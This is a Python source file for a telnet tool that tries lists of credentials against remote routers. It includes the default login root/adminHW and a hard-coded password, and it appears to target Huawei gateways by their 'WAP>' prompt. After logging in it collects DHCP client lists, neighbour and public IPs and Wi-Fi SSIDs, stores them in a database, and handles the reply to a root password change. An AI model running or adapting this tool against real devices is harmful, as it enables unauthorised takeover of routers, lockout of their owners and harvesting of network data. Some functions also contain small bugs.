#!/usr/bin/env python3

# This script perform telnet remote_sockets using socket instead of telnetlib.
# The intention is to execute command sequences quickly.
# Save, process and analyze logs output for creation of more command sequences.
# There exist a backend storing the results of executed command sequences.

import sys
import csv
import time
import socket
from psycopg2 import sql
from datetime import datetime

# Personal packages
from utils.colors import Colors
from commands.telnet_combinations import auth_request2
from backend.backend import conn_simple, login_log, process_ips, extract_ips, process_ssid, process_public_ips, update_telnet_pass

auth_timeout = 2
commands_timeout = 1
remote_sockets = list()

EOF     = b'\x04'   # End of File  [004]
ENTER   = b'\r\x00' # Enter Key    [013]

# Default credentials
username = b'root\r\n'
password = b'adminHW\r\n'
password = "EGflFhmzQUnTc8gJlku/".encode()

global_error = False

# Return a socket with the telnet session
# Return a socket with the telnet session
def telnet_auth_sequence(log_number, remote_host, remote_port, credentials_path, log_output=None, max_retries=5, detail=True):
    global global_error
    global auth_timeout
    global commands_timeout

    # Import credentials distinct to defaults one when specified
    credentials = []
    if not credentials_path.endswith('default.csv'):
        with open(credentials_path, 'r') as file:
            for line in file:
                items = line.strip().split(',')
                if len(items) >= 2:
                    credentials.append((items[0], items[1]))

    if not credentials:
        print(Colors.RED + "[!] No credentials loaded!" + Colors.R)
        return

    # Record the start time before attempting the remote_socket
    start_time = datetime.now()

    # Try to establish the socket once
    remote_socket = None
    for i in range(max_retries):
        try:
            remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            remote_socket.settimeout(auth_timeout)
            remote_socket.connect((remote_host, remote_port))
            remote_sockets.append(remote_socket)
            break  # Successfully connected
        except Exception as e:
            if detail:
                print(Colors.RED + f"[!] Connection attempt {i+1}/{max_retries} failed: {e}" + Colors.R)
            continue

    if not remote_socket:
        print(Colors.RED + "[!] Failed to establish connection after retries." + Colors.R)
        return None

    # Loop through the credentials
    for username_raw, password_raw in credentials:
        username = username_raw + '\r\n'
        password = password_raw + '\r\n'
        username = username.encode()
        password = password.encode()
        
        print(Colors.GREEN + f"{username}" + Colors.R)
        print(Colors.GREEN + f"{password}" + Colors.R)

        if remote_socket:
            try:
                # First wait for "Login:" or just send username
                response = socket_send_data(log_number, remote_host, remote_socket, username, auth_timeout, True)

                # If still asking for login, send again
                if b"Login:" in response:
                    response = socket_send_data(log_number, remote_host, remote_socket, username, auth_timeout, True)

                # Now send the password
                if b"Password:" in response:
                    if detail:
                        print(f"{Colors.ORANGE}[=>] Sending this password now:\t{password}{Colors.R}")

                    response = socket_send_data(log_number, remote_host, remote_socket, password, auth_timeout, True)

                # Check if login success
                if (b"Last login" in response or
                    b"Password is default value" in response or
                    b"The number of sessions exceeds" in response or
                    b"WAP>" in response):  # Your shell prompt here!
                    
                    login_data = [remote_host, datetime.now() - start_time, datetime.now(), True, password_raw]
                    login_log(login_data, log_number, False)

                    if detail:
                        print(Colors.GREEN + f"[!] Successful Telnet Session to [{remote_host}:{remote_port}] with user {username_raw}" + Colors.R)
                        print(Colors.GREEN + "---------------------------------------------------------------------" + Colors.R)
                    global_error = False

                    if detail:
                        print(Colors.ORANGE + f"[!] Elapsed time: {datetime.now() - start_time}" + Colors.R)

                    return remote_socket  # Return connected socket

                elif b"User name or password is wrong" in response or b"incorrect" in response:
                    # Failed attempt, log and try next credential
                    login_data = [remote_host, datetime.now() - start_time, datetime.now(), False, password_raw]
                    login_log(login_data, log_number, False)

                    if detail:
                        print(Colors.RED + f"[x] Failed login with {username_raw}:{password_raw}" + Colors.R)

                    # Now important:
                    # Check if server dropped connection
                    if remote_socket.fileno() == -1:
                        print(Colors.RED + "[!] Server closed connection after bad login, reconnecting..." + Colors.R)
                        # Try to reconnect
                        remote_socket.close()
                        for i in range(max_retries):
                            try:
                                remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                remote_socket.settimeout(auth_timeout)
                                remote_socket.connect((remote_host, remote_port))
                                remote_sockets.append(remote_socket)
                                break  # Successfully reconnected
                            except:
                                continue

            except Exception as e:
                if detail:
                    print(Colors.RED + f"[!] Exception during login attempt: {e}" + Colors.R)
                global_error = True
                return None

    print(Colors.RED + "[!] No valid credentials found after trying all combinations." + Colors.R)
    try:
        remote_socket.close()
    except:
        pass
    return None


# This methods doesn't include a timeout, it waits for all the data to be received
def socket_receive_all(remote_socket, byte_size=4096, end_marker=b"WAP>", timeout=5):
    buffer = b''
    start_time = time.time()

    try:
        while True:
            data = remote_socket.recv(byte_size)
            if not data:
                break

            buffer += data

            # Check for end marker indicating the server finished its response
            if end_marker in buffer:
                break

            # Reset the timeout if data is still being received
            start_time = time.time()

            # Break if no data has been received for the timeout duration
            if time.time() - start_time > timeout:
                break
    except Exception as e:
        pass  # Handle any exception if necessary (don't print in this case)

    return buffer


def socket_send_data(log_number, remote_ip, remote_socket, command, timeout=5, detail=False, max_retries=5):
    global global_error

    if remote_socket is None or remote_socket.fileno() == -1:
        if detail:
            print("[!] Socket closed.")
        global_error = True
        return b''

    # Attempt to send the command
    for _ in range(max_retries):
        try:
            remote_socket.sendall(command)
            break
        except Exception as e:
            #print(f"[!] Error sending command: {e}")
            continue


    # Define command-specific actions
    decoded_command = command.rstrip().decode()
    switch = {
        "display dhcp server user all": {
            "expected_pattern": b"display dhcp server user all",
            "handler": lambda response: process_ips(response, remote_ip)
        },
        "ip neigh": {
            "expected_pattern": b"ip neigh",
            "handler": lambda response: extract_ips(response, remote_ip)
        },
        "display wifi information": {
            "expected_pattern": b"SSID Index",
            "handler": lambda response: process_ssid(response, remote_ip)
        },
        "ip route show": {
            "expected_pattern": b"ip route show",
            "handler": lambda response: process_public_ips(response, remote_ip)
        },
        "EGflFhmzQUnTc8gJlku/": {
            "expected_pattern": b"Password of root has been modified successfully",
            "handler": lambda response: update_telnet_pass(response, remote_ip, log_number, False)
        },
    }

    # Get the expected pattern and handler
    action = switch.get(decoded_command, {})
    expected_pattern = action.get("expected_pattern", None)
    handler = action.get("handler", None)

    # Initialize response variables
    response = b''
    start_time = time.time()

    #while True:
    while response == b'':
        chunk = socket_receive_all(remote_socket, timeout=timeout)
        response += chunk

        # Check if the expected pattern is found and if the response ends with "WAP>"
        if expected_pattern and expected_pattern in response and response.endswith(b"WAP>"):
            if detail:
                print(Colors.GREEN + "[*] Expected pattern detected for database import!" + Colors.R)
            # Call the handler only when the response ends with "WAP>"
            if handler:
                handler(response)
            break

        # Timeout condition (no response received within timeout duration)
        if time.time() - start_time > timeout:
            break

    # Log the response
    print(f"FLAG:\t{response}")
    return response

# This method works for authenticating only
def socket_send_auth(log_number, remote_host, remote_socket, commands, timeout=1, detail=True, log_output=None, delay=2):
    global global_error

    response = b''

    if not remote_socket:
        return response

    cont = 1
    expected_patterns = [b"Login:", b"Password:", b"WAP>"]  # expected prompts after each command
    num_commands = len(commands)

    for idx, command in enumerate(commands):
        #if detail and not global_error:
        if detail:
            print(Colors.BOLD_WHITE + f"[{cont}] Sending this command to [{Colors.GREEN}{remote_host}{Colors.BOLD_WHITE}]: {command.strip()}" + Colors.R)

        # First, wait for the expected pattern BEFORE sending the command
        if idx < len(expected_patterns):
            expected = expected_patterns[idx]
            try:
                remote_socket.settimeout(timeout)
                buffer = b''
                start_time = time.time()
                while True:
                    try:
                        chunk = remote_socket.recv(4096)
                        if not chunk:
                            break
                        buffer += chunk

                        if expected in buffer:
                            if detail:
                                print(Colors.GREEN + f"[*] Detected expected pattern: {expected.decode(errors='ignore')}" + Colors.R)
                                print(Colors.ORANGE + f"{chunk}" + Colors.R)
                            break

                        if time.time() - start_time > timeout:
                            if detail:
                                print(Colors.RED + "[!] Timeout waiting for expected prompt." + Colors.R)
                            break
                    except socket.timeout:
                        break
            except Exception as e:
                if detail:
                    print(Colors.RED + f"[!] Exception while waiting for prompt: {e}" + Colors.R)

        # Then send the command
        if not global_error:
            response += socket_send_data(log_number, remote_host, remote_socket, command, timeout, detail)

        time.sleep(delay)
        cont += 1

    return response



# For sending list of commands. It is possible to save the output log
# timeout works for each command in the provided commands list
def socket_send_sequence(log_number, remote_host, remote_socket, commands, timeout=1, detail=True, log_output=None, delay=2):
    global global_error

    response = b''

    if not remote_socket:
        return response

    cont = 1
    for command in commands:
        if detail and global_error is False:
            pass
            print(Colors.BOLD_WHITE + f"[{cont}] Sending this command to [{Colors.GREEN}{remote_host}{Colors.BOLD_WHITE}]:" + Colors.ORANGE + f"\n[==>] Sending:\n{command}\n" + Colors.R)

        # Send the data to remote socket
        if global_error is False:
            response += socket_send_data(log_number, remote_host, remote_socket, command, timeout, detail)

        time.sleep(delay)
        cont += 1

    if log_output:
        # Write decoded output to a log
        with open(log_output, 'a') as file:
            response = response.decode('latin') #+ "\n"
            #response = response.decode('ascii') + "\n"
            file.write(response)
            if log_output:
                pass
                print(Colors.BOLD_WHITE + "[!] Logged output into:"+ Colors.ORANGE + f"\n{log_output}" + Colors.R)
            if global_error == True and detail:
                print(Colors.RED + "---------------------------------------------------------------------" + Colors.R)
                global_error = False # refresh the boolean

        # Close the file properly
        file.close()

    return response




# This method is for sending a single command that doesn't finish and we need to maintain
# Per example, executing a ping on the remote telnet
def socket_send_command(remote_socket, command, detail=False):
    if detail:
        print(Colors.BOLD_WHITE + f"[!] Sending this command, no waiting response:" + Colors.ORANGE + f"\n{command}\n" + Colors.R)
        pass

    if remote_socket is None or remote_socket.fileno() == -1:
        print("[!] Socket closed.")
        pass
    else:
        remote_socket.sendall(command)

        # Doesn't wait for a response and maintain active the socket
        if detail:
            print(Colors.GREEN + "[!] Maintaining remote telnet session ACTIVE...." + Colors.R)
        pass
        while remote_socket:
            time.sleep(1)


# This method is for sending the command and waiting for the response
# all the necessary time
def socket_send_commands(remote_socket, commands, timeout, detail=True):    # There's not a timeout here

    cont = 1
    host = None
    response = b''
    for command in commands:
        if detail:
            print(Colors.BOLD_WHITE + f"[{cont}] Sending this command to [{host}]:" + Colors.ORANGE + f"\n{command}\n" + Colors.R)
            pass
        remote_socket.sendall(command)

        response = receive_from(remote_socket, timeout)

        if detail == True:
            print(Colors.GREEN + "[<==] Received:" + Colors.R + f"\n{response}\n")
            print(Colors.GREEN + "---------------------------------------------------------------------" + Colors.R)

        cont+=1

    return response


def receive_from(remote_socket, timeout):
    buffer = ""
    # we set a 2 second timeout, depending on your target this may need to be adjusted
    remote_socket.settimeout(timeout)

    try:
        # keep reading into the buffer until there's no more data
        # or we timeout
        while True:
            data = remote_socket.recv(4096)

            if not data:
                break

            buffer += data
    except:
        pass

    return buffer

